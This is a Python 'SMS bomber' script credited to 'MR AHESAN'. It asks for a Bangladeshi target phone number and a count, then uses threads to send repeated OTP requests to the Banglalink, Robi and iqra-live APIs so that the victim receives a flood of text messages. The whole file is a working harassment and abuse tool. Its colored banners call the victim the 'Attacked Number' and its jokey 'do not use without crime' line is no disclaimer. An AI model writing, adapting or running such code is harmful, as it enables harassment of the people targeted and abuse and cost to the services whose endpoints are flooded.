import requests
import os
import sys
import time
from colorama import Fore, Style
from termcolor import colored
from pyfiglet import Figlet
import random
from concurrent.futures import ThreadPoolExecutor, as_completed

colorArr = ["\033[1;91m", "\033[1;92m", "\033[1;93m", "\033[1;94m", "\033[1;95m", "\033[1;96m"]

class RandomColor:
    def __init__(self):
        self.color = random.choice(colorArr)

version = "2.1.8"
url = "https://eshop-api.banglalink.net/api/v1/customer/send-otp"
url1 = "https://da-api.robi.com.bd/da-nll/otp/send"
url2 = "https://apibeta.iqra-live.com/api/v2/sent-otp/{phone}?amount={amount}"
headers = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
    "Content-Type": "application/json"
}
headers1 = {
    "Accept": "application/json, text/plain, */*",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "keep-alive",
    "Content-Length": "24",
    "Content-Type": "application/json",
    "Host": "da-api.robi.com.bd",
    "Origin": "https://onlinesim.robi.com.bd",
    "Referer": "https://onlinesim.robi.com.bd/",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-site",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "sec-ch-ua": "\"Not-A.Brand\"; v=\"99\", \"Chromium\"; v=\"124\"",
    "sec-ch-ua-mobile": "70",
    "sec-ch-ua-platform": "\"Linux\""
}
headers2 = {
    "Accept": "application/json, text/plain, */*",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "keep-alive",
    "Host": "apibeta.iqra-live.com",
    "Origin": "https://iqra-live.com",
    "Referer": "https://iqra-live.com/",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-site",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "sec-ch-ua": "\"Not-A.Brand\"; v=\"99\", \"Chromium\"; v=\"124\"",
    "sec-ch-ua-mobile": "70",
    "sec-ch-ua-platform": "\"Linux\""
}

def generate_ascii_art(text, font="standard"):
    fig = Figlet(font=font)
    ascii_art = fig.renderText(text)
    colored_ascii_art = random.choice(colorArr) + ascii_art
    print(colored_ascii_art)

def animated_print(text, color='white', delay=0.1):
    for char in text:
        sys.stdout.write(colored(char, color))
        sys.stdout.flush()
        time.sleep(delay)
    print()

def check_internet_connection():
    try:
        requests.get("http://google.com", timeout=5)
        return True
    except requests.ConnectionError:
        return False

TOOLBANNER = random.choice(colorArr) + """
       ★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★
       ★°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°★
       ★°          AUTHOR: MR AHESAN                  °★
       ★°          TOOL  : All-SIM-SMS-BOMBER         °★
       ★°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°★
       ★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★
"""

def main():
    os.system('clear')
    text_to_convert = "           AHESAN"
    generate_ascii_art(text_to_convert)
    print(colored(TOOLBANNER))

    animated_print("          𝗣𝗟𝗘𝗔𝗦𝗘 𝗗𝗢 𝗡𝗢𝗧 𝗨𝗦𝗘 𝗧𝗛𝗜𝗦 𝗧𝗢𝗢𝗟 𝗪𝗜𝗧𝗛𝗢𝗨𝗧 𝗖𝗥𝗜𝗠𝗘 ", 'red')
    print("\n\n\n")

def run():
    try:
        while True:
            phone = input(random.choice(colorArr) + "\n Enter Your Target Number[+88]: " + random.choice(colorArr))
            if len(phone) != 11 or not phone.startswith("01"):
                print("Please Enter a valid number.")
            else:
                break
                
        while True:
            try:
                amount = int(input(random.choice(colorArr) + "\n Enter Your Target Amount: " + random.choice(colorArr)))
                break
            except ValueError:
                print("Please enter a valid Amount.")
        print("\n\n")
        animated_print("               BOMBER SUCCESSFULLY STARTED....", 'green')
        print("\n")
        
        # Check for internet connection
        while not check_internet_connection():
            print(colored("Make sure that you are connected to the internet.....", 'red'))
            time.sleep(1)  # Wait for 1 second before checking again
        
        sentOtp(phone, amount)
            
    except requests.exceptions.ConnectionError:
        animated_print(" No internet", 'red')

def sentOtp(phone, amount):
    def send_request(i):
        data = '{"type":"phone","phone":"'+phone+'"}'
        data1 = {"msisdn": phone}
        url2_formatted = url2.format(phone=phone, amount=i+1)  # Assuming 'amount' is incremented for each request

        try:
            resp1 = requests.post(url, headers=headers, data=data)
            resp2 = requests.post(url1, headers=headers1, json=data1)
            resp3 = requests.get(url2_formatted, headers=headers2)
            if resp1.status_code == 200 or resp2.status_code == 200 or resp3.status_code == 200:
                return f"\nOTP Sent Successfully {Fore.YELLOW}To{Style.RESET_ALL} {Fore.GREEN}Attacked{Style.RESET_ALL} {Fore.YELLOW}Number{Style.RESET_ALL}:{Fore.RED}{phone}{Style.RESET_ALL} {Fore.YELLOW} \nREQUEST{Style.RESET_ALL}: {Fore.MAGENTA}[{i+1}]{Style.RESET_ALL}                    {Fore.YELLOW}Stay{Style.RESET_ALL} {Fore.GREEN}With{Style.RESET_ALL} {Fore.BLUE}AHeSaN{Style.RESET_ALL}"
            else:
                return f"Failed to send OTP. Status code: {resp1.status_code} / {resp2.status_code} / {resp3.status_code}"
        except requests.exceptions.RequestException:
            return "Your Connection is Aborted"

    internet_lost = False  # Flag to track if internet connection is lost
    with ThreadPoolExecutor(max_workers=10) as executor:
        future_to_index = {executor.submit(send_request, i): i for i in range(amount)}

        for future in as_completed(future_to_index):
            i = future_to_index[future]
            try:
                result = future.result()
                print(random.choice(colorArr) + result)
                if i == amount - 1:  # Display the message and wait for input only after the last request is sent
                    animated_print(f"\n\n             BOMBING DONE", 'green')
                    print("\n\n\n")
                    input(f"                {Fore.RED}Press {Style.RESET_ALL}{Fore.GREEN}Enter {Style.RESET_ALL}{Fore.YELLOW}For {Style.RESET_ALL}{Fore.CYAN}Main {Style.RESET_ALL}{Fore.GREEN}Menu{Style.RESET_ALL}")
                    os.system('clear')
                    return
            except Exception as e:
                if not internet_lost:  # Print the message only once when internet connection is lost
                    print(colored("\nYour Connection is Aborted", 'red'))
                    internet_lost = True
                time.sleep(1)  # Wait for 1 second
if __name__ == "__main__":
    main()
    run()